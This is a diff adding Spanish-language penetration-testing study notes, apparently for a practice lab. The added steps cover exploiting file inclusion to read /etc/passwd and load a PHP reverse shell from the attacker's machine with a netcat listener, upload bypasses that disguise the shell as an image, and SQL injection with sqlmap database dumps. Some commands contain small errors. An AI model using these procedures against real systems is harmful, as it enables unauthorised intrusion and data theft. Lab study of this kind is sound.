@@ -218,8 +218,74 @@ EXPLOTACION
 
             CSRF/CROSS SITE REQUEST FORGERY
             ...............................
-                  Esta vulnerabilidad aprovecha el cambio de contraseña. En la url aparece usuario y contraseña.  
-      
+                  
+                  -  Esta vulnerabilidad aprovecha el cambio de contraseña. En la url aparece usuario y contraseña.  
+                  -  El link se acorta y se envia a la victima
+                  
+            FILE INCLUSION
+            ..............
+   
+                  - Si vemos /?page= y acaba en .php es posible que exista la vulnerabilidad
+                  - Probar /etc/passwd => esto muestra los usuarios 
+                           si no funciona poner /../../../../
+                  - Si muestra el contenido es vulnerable
+                           - Las webs se almacena en:
+                              - LINUX: /var/www/
+                              - WINDOWS: C:/inetpub/www
+
+                  Se explota subiendo una reverse-shell.php se hace asi:
+
+                  1 - Buscas una en internet ej: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+                  2 - Copias el codigo y creas un archivo 
+                           sudo nano reverse.php => pegas el codigo copiado
+                  3 - Cambias los parametros IP y PUERTO => pones IP de nuestra KALI y el puerto configurado
+                  4 - Damos permisos de ejecucion
+                           sudo chmod -x reverse.php
+                  5 - Creamos un servidor para subir el archivo
+                           python3 -m http.server 8080
+                  6 - Ponemos en escucha nuestro KALI
+                           nc -lvnp 4444
+                  6 - Ponemos la direccion de mi servidor KALI en la url 
+                           http://10.10.231.229/vulnerabilities/fi/?page=http//IPKALI:8080/reverse.php
+
+            FILE UPLOAD
+            ...........
+
+                  Esta vulnerabilidad consiste en subir una reverse shell camuflada en un archivo esperado ej: .jpg .png etc
+
+                  - Forma facil te deja directamente subir un archivo cualquiera. Ej: reverse.php => contiene una reverse shell
+                  - Forma normal => se debe camuflar el archivo en lo esperado. Se hace asi:   
+                        1 - Burpsuite => abrimos y configuramos para interceptar
+                        2 - Subimos el archivo reverse.php e Interceptamos peticion
+                        3 - Hay dos opcines posibles:
+                              Cambiamos cabecera si el archivo es reverse.php
+                                 -Content-type: image/png
+                              Cambiamos extension si es reverse.jpg => esta camuflado la reverse
+                        4 - Hacer fuzzing para buscar la carpeta upload y ejecutar la reverse shell
+
+            SQL INJENCTION
+            ..............
+                  
+                  Estructura Base de datos => BASE DE DATOS > TABLAS > COLUMNAS > CAMPOS > VALOR
+
+                  Probamos si es Vulnerable con => ' o 'or '1'='1 => Si es vulnerable:
+
+                  1 - Abrimos Burpsuite > configuramos > hacemos consulta 
+                  2 - Guardamos consulta.req
+                  3 - Lanzamos comando sqlmap
+                        sqlmap -r consulta.req -p id --batch --dbs
+                  4 - Si detecta las bases de datos vamos profundizando:
+                        sqlmap -r consulta.rez -p id -D <base de datos> --tables
+                        sqlmap -r consulta.rez -p id -D <base de datos> -T <Tabla> --columns
+                        sqlmap -r consulta.rez -p id -D-D <base de datos> -T <Tabla> -C <Columna,Columna2...> --dump
+                  5 - Podemos crackear los hashes con john siguiendo los pasos de sqlmap
+
+            XSS/CROSS SITE SCRIPTING
+            ........................
+
+                  
+
+
       BUSCAR EXPLOIT
       ..............
 
